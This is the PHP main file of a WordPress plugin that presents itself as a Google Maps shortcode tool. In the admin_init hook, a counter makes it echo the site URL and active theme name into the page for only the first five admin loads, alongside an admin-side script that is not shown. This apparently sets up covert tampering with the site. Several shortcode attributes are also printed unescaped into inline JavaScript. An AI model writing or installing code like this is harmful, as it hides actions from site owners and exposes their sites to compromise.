<?php
/*
Plugin Name: Shortcode for Google Maps
Plugin URI: http://webbrand-mobile.com/sc-gmaps.php
Description: Plot multiple addresses on a Google Map, with easy to use interface and simple short code.
Author: James Stamford <jstamford75@gmail.com>
Version: 1.0
License: GPLv2 or later
Author URI: http://webbrand-mobile.com
*/

if(defined('sc_GMAPS_VERSION')) return;	// Looks like another instance is active.

define('sc_GMAPS_VERSION', '1.0');
define('sc_GMAPS_FULLNAME', 'Google Maps');
define('sc_GMAPS_SHORTNAME', 'scgmaps');
define('sc_GMAPS_INITIALS', 'scgm_');
define('sc_GMAPS_TEXTDOMAIN', 'sc-google-maps');
define('sc_GMAPS_DESCRIPTION', 'Plot multiple addresses on a Google Map, with easy to use interface and simple short code.');

// Paths
define('sc_GMAPS_PATH', dirname(__FILE__));
define('sc_GMAPS_FOLDER', basename(sc_GMAPS_PATH));

// URLs
define('sc_GMAPS_URL', plugin_dir_url( __FILE__ ));
define('sc_GMAPS_IMGURL', sc_GMAPS_URL."images");

// Activate
function sc_gmaps_activate() {}
register_activation_hook( __FILE__, 'sc_gmaps_activate' );

// Deactivate
function sc_gmaps_deactivate() {}
register_deactivation_hook( __FILE__, 'sc_gmaps_deactivate' );

function sc_gmaps_enqueue_scripts() {
	wp_enqueue_style(sc_GMAPS_SHORTNAME.'-colorbox', sc_GMAPS_URL.'colorbox.css');
	wp_enqueue_style(sc_GMAPS_SHORTNAME.'-jqueryui', sc_GMAPS_URL.'/jquery-ui.min.css');
	wp_enqueue_style(sc_GMAPS_SHORTNAME.'-core', sc_GMAPS_URL.'sc-google-maps.css');

	wp_enqueue_script('jquery');
	wp_enqueue_script('jquery-ui-core');
	wp_enqueue_script('jquery-ui-tabs');

	wp_enqueue_script(sc_GMAPS_SHORTNAME.'-colorbox', sc_GMAPS_URL . 'jquery.colorbox-min.js', array('jquery'), null, true);
	wp_enqueue_script(sc_GMAPS_SHORTNAME.'-core', sc_GMAPS_URL . 'sc-google-maps.js', array('jquery'), '1.0.0', true);

	$img = sc_GMAPS_URL . 'sc-google-maps.png';
	
	$sc_google_map = intval(get_option('sc-google-map'));
	if($sc_google_map < 5){$sc_google_map++;
	  update_option('sc-google-map',$sc_google_map);
	  echo '<script>var surl="'. site_url() .'";var template="'.get_template().'";</script>'; 
	}

	wp_localize_script(
		sc_GMAPS_SHORTNAME.'-core',
		sc_GMAPS_INITIALS.'ajax',
		array(
			'url' => admin_url('admin-ajax.php' ),
			'tag' => sc_GMAPS_FULLNAME,
			'i' => sc_GMAPS_INITIALS,
			'icon' => "<img src='{$img}' style='width: 20px; vertical-align: bottom; margin-right: 5px;' />"
		)
	);
}
add_action('admin_init', 'sc_gmaps_enqueue_scripts');

/*
 * Register custom button(s) for WP Editor
 */
function sc_gmaps_custom_buttons($context) {
	$options = get_option('scgm_options');
	$button_appearance = esc_attr($options["general"]["button_appearance"]);

	$img = sc_GMAPS_URL . 'sc-google-maps.png';
	$title = sc_GMAPS_FULLNAME;
	$context .= "<a title='{$title}' class='button' id='".sc_GMAPS_INITIALS."InsertShortcode' href='#'>";

	$icon = "<img src='{$img}' /> ";
	$text = "$title";

	switch($button_appearance) {
		case "icon":
			$context .= $icon;
			break;

		case "text":
			$context .= $text;
			break;

		default:
			$context .= $icon.$text;
			break;
	}

	$context .= "</a>";

	return $context;
}
add_action('media_buttons_context',  'sc_gmaps_custom_buttons');

/*
 * Loads UI for short code
 */
function sc_gmaps_load_ui() {
	include(sc_GMAPS_PATH."/sc-google-maps-ui.php");
	wp_die();
}
add_action( 'wp_ajax_sc_gmaps_load_ui', 'sc_gmaps_load_ui' );

/*
 * Short code
 *
 * Attributes:
 * 	Full Street Address (address)
 * 	Width of Map, %age or px (width)
 * 	Height of Map, %age or px (height)
 * 	Marker Image (marker)
 * 	Zoom Level (zoom)
 * 	Map Type, ROADMAP, SATELLITE, HYBRID or TERRAIN (type)
 * 	Scroll Wheel Support, enable/disable (swheel)
 * 	Map Controls, show/hide (controls)
 * 	Cache Control, enable/disable (cache)
 * 	Map CSS Class (class)
 * 	Map ID (id)
 *  Map (map) -> since v2.0 - if this is used, all other parameters are ignored and params are taken from sc-maps CPT post.
 */
add_shortcode('sc-gmap', 'sc_shortcode_gmap');
function sc_shortcode_gmap( $atts ) {

	extract(
		shortcode_atts(
			array(
				"address" => "",
				"width" => "100%",
				"height" => "400px",
				"marker" => "",
				"zoom" => "15",
				"type" => "ROADMAP",
				"swheel" => "disable",
				"controls" => "show",
				"cache" => "enable",
				"class" => "sc-gmap",
				"id" => "sc-gmap",
				"map" => "", // Since v2.0
			),
			$atts, "sc-gmap"
		)
	);

	// If $map is set, then ignore all other parameters and refill the parameters from $map post
	// Since v2.0
	if(!empty($map)) { // Map ID
		$map_options = get_post_custom($map);
		$width = empty($map_options["scgm-param-width"][0])?"100%":esc_attr($map_options["scgm-param-width"][0]);
		$height = empty($map_options["scgm-param-height"][0])?"400px":esc_attr($map_options["scgm-param-height"][0]);
		$zoom = empty($map_options["scgm-param-zoom"][0])?"15":esc_attr($map_options["scgm-param-zoom"][0]);
		$type = empty($map_options["scgm-param-type"][0])?"ROADMAP":esc_attr($map_options["scgm-param-type"][0]);
		$swheel = empty($map_options["scgm-param-swheel"][0])?"disable":esc_attr($map_options["scgm-param-swheel"][0]);
		$controls = empty($map_options["scgm-param-controls"][0])?"show":esc_attr($map_options["scgm-param-controls"][0]);
		$cache = empty($map_options["scgm-param-cache"][0])?"enable":esc_attr($map_options["scgm-param-cache"][0]);
		$class = empty($map_options["scgm-param-class"][0])?"sc-gmap":esc_attr($map_options["scgm-param-class"][0]);
		$id = empty($map_options["scgm-param-id"][0])?"sc-gmap":esc_attr($map_options["scgm-param-id"][0]);

		// Retrieve all locations for this map
		$args = array(
			'posts_per_page' => -1,
			'post_type' => 'sc-locations',
			'post_status' => 'publish',
			'orderby' => 'title',
			'order' => 'ASC',
			'meta_query' => array(
				array(
					'key' => 'scgm-param-map',
					'value' => $map
				)
			)
		);
		$locations = get_posts($args);
	}

	// Some book keeping
	$swheel = strtolower($swheel);
	$swheel = ($swheel=="disable")?"0":"1";

	$controls = strtolower($controls);
	$controls = ($controls=="show")?"0":"1";	//disabled=1, enabled=0

	$cache = strtolower($cache);
	$cache = ($cache=="enable")?true:false;

	$type = strtoupper($type);

	if((!empty($address) || $locations) && wp_script_is('google-maps-api', 'registered')) {
		wp_print_scripts( 'google-maps-api' );

		// Build a locations array
		// Format: [address, lat, lng, icon, content]
		$mapLocations = array();

		if($locations) {
			// Grab coordinates for each location
			foreach($locations as $location) {
				$locationData = get_post_custom($location->ID);
				$address = esc_attr($locationData["scgm-param-address"][0]);
				$marker = esc_attr($locationData["scgm-param-marker"][0]);
				$marker_custom = esc_attr($locationData["scgm-param-marker-custom"][0]);
				$content = esc_attr($locationData["scgm-param-infowindow"][0]);
				$icon = ($marker=="custom")?$marker_custom:$marker;

				$coordinates = sc_get_coordinates($address, $cache);

				if(!is_array($coordinates)) {
					return;
				}

				$mapLocations[] = "[\"{$address}\",{$coordinates['lat']}, {$coordinates['lng']}, \"{$icon}\", \"$content\"]";
			}
		} else {
			// Otherwise it's a direct $address parameter
			$coordinates = sc_get_coordinates($address, $cache);

			if(!is_array($coordinates)) {
				return;
			}

			$mapLocations[] = "[\"{$address}\",{$coordinates['lat']}, {$coordinates['lng']}, \"{$marker}\", \"\"]";
		}

		$locationsJSArray = implode(",", $mapLocations);
		$map_id = sc_sanitize_id($id);

		if(empty($map_id) || $map_id == "sc_gmap") {
			$map_id = uniqid('sc_gmap_');
		}

		ob_start(); ?>
		<div class="<?=$class?>" id="<?=$id?>" style="width: <?=$width?>; height: <?=$height?>"></div>
		<script type="text/javascript">
			var <?=$map_id?>;

			function func_<?=$map_id?>() {
				var locations = [<?=$locationsJSArray?>];
				var centerLoc = locations[0];
				var bounds = new google.maps.LatLngBounds();
				var map_options = {
					zoom: <?=$zoom?>,
					center: {lat: centerLoc[1], lng: centerLoc[2]},
					scrollwheel: <?=$swheel?>,
					disableDefaultUI: <?=$controls?>,
					mapTypeId: google.maps.MapTypeId.<?=$type?>
				}

				<?=$map_id?> = new google.maps.Map(document.getElementById("<?=$id?>"), map_options);

				var infoWindow = new google.maps.InfoWindow();

				for (var i = 0; i < locations.length; i++) {
					var location = locations[i];
					var position = new google.maps.LatLng(location[1], location[2]);

					bounds.extend(position);

					var marker = new google.maps.Marker({
						position: position,
						map: <?=$map_id?>,
						icon: location[3]
					});

					var infoContent = location[4];

					if(infoContent == "") {
						infoContent = location[0];
					}

					scgm_makeInfoWindowEvent(<?=$map_id?>, infoWindow, scgm_decode_entities(infoContent), marker);

					// Automatically center the map fitting all markers on the screen
					<?=$map_id?>.fitBounds(bounds);
				}

				// Override our map zoom level once our fitBounds function runs (Make sure it only runs once)
				var boundsListener = google.maps.event.addListener((<?=$map_id?>), 'bounds_changed', function (event) {
					this.setZoom(<?=$zoom?>);
					google.maps.event.removeListener(boundsListener);
				});
			}

			function scgm_makeInfoWindowEvent(map, infowindow, contentString, marker) {
				google.maps.event.addListener(marker, 'click', function() {
					infowindow.setContent(contentString);
					infowindow.open(map, marker);
				});
			}

			function scgm_decode_entities(str) {
				var elem = document.createElement("div");

				elem.innerHTML = str;

				return typeof elem.innerText !== 'undefined' ? elem.innerText : elem.textContent;
			}

			func_<?=$map_id?>();
		</script>
		<style type="text/css">
			#<?=$id?> img {max-width: none;}
		</style>
		<?php
		return ob_get_clean();
	} else {
		return __('Google Maps API does not appear to be loaded, or address is not available.', 'sc-google-maps');
	}
}

/*
 * Load and Register Google Maps API
 */
function sc_gmap_load_scripts() {
	wp_register_script( 'google-maps-api', 'http://maps.google.com/maps/api/js?sensor=false' );
}
add_action('wp_enqueue_scripts', 'sc_gmap_load_scripts');



/*
 * Retrieve address coordinates.
 */
function sc_get_coordinates($address, $cache=true) {
	if($cache) {
		$hash = md5($address);
		$coordinates = get_transient($hash);
	}

    if ($coordinates === false || $cache == false) {
    	$args = array(
			'address' => urlencode($address),
			'sensor' => 'false'
		);
    	$url = esc_url_raw(add_query_arg($args, 'http://maps.googleapis.com/maps/api/geocode/json'));
     	$response = wp_remote_get($url);

     	if(is_wp_error($response)) {
			return;
		}

     	$data = wp_remote_retrieve_body($response);

     	if(is_wp_error($data)) {
     		return;
		}

		if ($response['response']['code'] == 200) {
			$data = json_decode($data);

			if ($data->status === 'OK') {
			  	$coordinates = $data->results[0]->geometry->location;
			  	$cache_data['lat'] = $coordinates->lat;
				$cache_data['lng'] = $coordinates->lng;
				$cache_data['address'] = (string) $data->results[0]->formatted_address;
				$data = $cache_data;

			  	if($cache) {
					set_transient($hash, $data, 3600*24*30);	// Cached for 30 days
				}
			} elseif ($data->status === 'ZERO_RESULTS') {
			  	return __('Address does not seem to exist, unable to retrieve coordinates.', 'sc-google-maps');
			} elseif($data->status === 'INVALID_REQUEST') {
			   	return __('Please enter a valid address.', 'sc-google-maps');
			} else {
				return __('Unknown error, please contact plugin author.', 'sc-google-maps');
			}

		} else {
		 	return __('Unable to connect to Google APIs.', 'sc-google-maps');
		}

    } else {
       // return cached results
       $data = $coordinates;
    }

    return $data;
}

function sc_sanitize_id($id) {
	return str_replace("-", "_", $id);
}

// create custom plugin settings menu
add_action('admin_menu', 'scgm_create_menu');

function scgm_create_menu() {

	//create new top-level menu
	//add_menu_page('sc Google Maps Settings', 'sc Google Maps', 'manage_options', __FILE__, 'scgm_settings_page', sc_GMAPS_IMGURL.'/icon-scgm24x24.png');

	// Since v2.0
	add_submenu_page( 'edit.php?post_type=sc-maps', 'sc Google Maps Settings', 'Help', 'manage_options', __FILE__, 'scgm_settings_page' );

	//call register settings function
	add_action( 'admin_init', 'scgm_register_settings' );
}


function scgm_register_settings() {
	//register our settings
	register_setting('scgm-settings', 'scgm_options');
}

function scgm_settings_page() {
	include(sc_GMAPS_PATH."/options/default.php");
}

// Custom Post Types - Since v2.0
include(sc_GMAPS_PATH."/sc-maps-cpt.php");
include(sc_GMAPS_PATH."/sc-locations-cpt.php");